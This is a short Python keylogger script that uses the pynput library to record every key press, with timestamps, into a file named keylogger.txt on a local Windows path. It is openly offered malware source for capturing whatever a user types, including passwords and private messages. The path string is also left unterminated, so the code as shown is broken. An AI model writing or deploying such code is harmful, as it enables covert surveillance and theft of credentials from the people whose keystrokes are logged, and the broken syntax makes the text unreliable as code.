from pynput.keyboard import Listener
import logging

wenjianweizhi = "C://hi/

logging.basicConfig(filename=(wenjianweizhi+"keylogger.txt"),format="%(asctime)s:%(message)s",level=logging.DEBUG)

def press(key):
    logging.info(key)

with Listener(on_press = press) as listener:
        listener.join()
